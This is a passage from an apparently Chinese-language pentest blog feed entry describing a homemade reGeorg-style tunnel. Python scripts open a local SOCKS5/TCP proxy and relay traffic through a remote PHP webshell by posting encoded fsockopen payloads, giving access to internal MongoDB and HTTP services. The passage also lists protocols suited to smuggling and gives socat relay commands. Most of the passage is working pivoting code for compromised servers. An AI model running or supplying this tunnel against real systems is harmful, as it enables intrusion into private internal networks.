data&#x3D;exp, proxies&#x3D;&#123;&quot;http&quot;: &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;,                                headers&#x3D;&#123;&quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;&#125;).content        sock.send(content)        print &quot;&gt;&gt; Sending Data to Client&quot;        flag2 &#x3D; sock.recv(1)        while flag2:            sendPayload(sock,flag2)        # else:        #     s.close()        #     exit(0)        # # s.close()    else:        passs &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 2)s.bind((&quot;127.0.0.1&quot;, 9999))s.listen(5)while 1:    try:        sock, addr_info &#x3D; s.accept()        print &quot;[Accept Bytes]&quot;        flag &#x3D; sock.recv(1)        if flag &#x3D;&#x3D; &quot;\x05&quot;:            target, targetPort &#x3D; parseSocks5(sock)            sendPayload(sock)        else:            sendPayload(sock,flag)    except KeyboardInterrupt:        exit(0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用方法: <code>python rego.py &lt;webshell&gt; &lt;webshell&#39;s pass&gt;</code> </p><p>这个很烂的单线程代码实现了这样的功能:</p><ol><li>开启一个本地的9999的socks5代理</li><li>使用这个代理可以用curl访问内网web服务</li><li>可以访问这些数据库，mongo可用</li><li>使用了8080作为代理，放在burp里面看流量</li></ol><p>有这样的缺点:</p><ol><li>curl访问web和访问mongo只能选一个(比如开了两个窗口，一个访问http，一个访问mongo)</li><li>速度很慢，取决于实际环境，自己调timeout</li><li>ssh或者mysql不能用，因为没有保持socks连接。</li></ol><p>为什么reGeorg就可以？因为reGeorg用<code>while true</code>循环保持了socks连接，通过写入cookie的数据进行交互。</p><p>测试主要使用了socat转发流量:</p><pre class="line-numbers language-none"><code class="language-none">socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><p>测试了下redis不可用，因为默认redis使用的是RESP的协议。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;背景: linux，php环境下的reGeorg不可用。&lt;br&gt;目标: 分析reGeorg的原理尝试改一下&lt;br&gt;结果: 造了一个半成品，因为不能保持socks连通，可以用来访问简单的协议流数据。比如http，mongo，redis&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;Protocols that are suitable to smuggle
  HTTP based protocol:
    Elastic, CouchDB, Mongodb, Docker

  Text-based protocol:
    FTP, SMTP, Redis, Memcached&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;



&lt;h3 id=&quot;尝试1&quot;&gt;&lt;a href=&quot;#尝试1&quot; class=&quot;headerlink&quot; title=&quot;尝试1&quot;&gt;&lt;/a&gt;尝试1&lt;/h3&gt;&lt;p&gt;这个脚本是个残的:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;#coding: utf-8
import socket
import binascii
import requests


headers &amp;#x3D; &amp;#123;
&amp;quot;Host&amp;quot;: &amp;quot;&amp;quot;,
&amp;quot;Accept-Encoding&amp;quot;: &amp;quot;gzip, deflate&amp;quot;,
&amp;quot;User-Agent&amp;quot;: &amp;quot;Mozilla&amp;#x2F;5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko&amp;#x2F;20050405 Firefox&amp;#x2F;1.0 (Ubuntu package 1.0.2)&amp;quot;,
&amp;quot;Content-Type&amp;quot;: &amp;quot;application&amp;#x2F;x-www-form-urlencoded&amp;quot;,
&amp;quot;Connection&amp;quot;: &amp;quot;close&amp;quot;
&amp;#125;

url &amp;#x3D; &amp;quot;http:&amp;#x2F;&amp;#x2F;127.0.0.1&amp;#x2F;eval.php&amp;quot;
s &amp;#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((&amp;quot;127.0.0.1&amp;quot;,8889))
s.listen(5)
sock, addr_info &amp;#x3D; s.accept()

while True:
    print &amp;#39;Connect by &amp;#39;, addr_info
    data &amp;#x3D; sock.recv(102400)
    payload &amp;#x3D; &amp;#39;pass&amp;#x3D;%24res%20%3D%20fsockopen(%22127.0.0.1%22%2C27017)%3B%0A%24raw%20%3D%20hex2bin(%22&amp;#39; + hex2bin(data) + &amp;quot;%22)%3B%0Astream_set_timeout(%24res%2C5)%3B%0Astream_set_blocking(false)%3B%0Afwrite(%24res%2C%24raw)%3B%0A%24info%20%3D%20stream_get_meta_data(%24res)%3B%0Aecho%20%24info%5B&amp;#39;timed_out&amp;#39;%5D%3B%0Awhile%20(%24o%20%3Dfgets(%24res%2C5))%7B%0A%20%20%20%20%20%20%20%20if(%24o%20%3D%3D%3D%20false)%7Becho%20&amp;#39;false%20lala&amp;#39;%3B%7D%0A%24readBuff%20.%3D%20%24o%3B%0A%7D%0Aecho%20%24readBuff%3B%0Afclose(%24res)%3B&amp;quot;
    print payload
    data2 &amp;#x3D; requests.post(url&amp;#x3D;url,headers&amp;#x3D;headers,data&amp;#x3D;payload,proxies&amp;#x3D;&amp;#123;&amp;quot;http&amp;quot;:&amp;quot;http:&amp;#x2F;&amp;#x2F;127.0.0.1:8080&amp;quot;&amp;#125;,timeout&amp;#x3D;30).content
    print data2
    print &amp;quot;sending data&amp;quot;
    sock.send(data2)&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;hex2bin is available with PHP Version &amp;gt;= 5.4.0&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;绑定本机的8889端口，然后mongo直接连,&lt;code&gt;mongo --port 8889&lt;/code&gt;,如果想观察之间的流量可以这样做:&lt;/p&gt;
 &lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;python mongo_proxy  &amp;#x2F;&amp;#x2F;监听8889
socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889 &amp;#x2F;&amp;#x2F;流量肉眼可以看
mongo --port 8888  &amp;#x2F;&amp;#x2F;连接8888&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;发散一下，这个整体就是一个请求代理，包裹一下发送到了远程的webshell，然后webshell之行脚本。Regeorg是更通用的方式，你可以把这个脚本看作regeorg作用的&lt;code&gt;子集&lt;/code&gt;，因为如果要访问端口之类的就需要改脚本了。&lt;/p&gt;
&lt;p&gt;看了看Regeorg的实现，就是接受socks5或者socks4的代理之后，发送数据包到远程服务器，过程大概是这样子的:&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
</feed>
